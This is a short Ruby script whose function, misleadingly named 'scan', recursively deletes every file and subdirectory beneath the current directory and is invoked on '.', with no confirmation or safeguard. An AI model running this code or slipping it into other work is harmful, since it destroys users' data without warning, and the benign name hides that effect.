# frozen_string_literal: true

def entries(path)
  Dir.new(path)
     .entries
     .reject { |x| %w[. ..].include? x }
     .map { |x| File.join(path, x) }
end

def scan(path)
  entries(path).each do |item|
    if File.directory?(item)
      scan(item)
      Dir.rmdir(item)
    else
      File.unlink item
    end
  end
end

path = File.join('.')
scan(path)
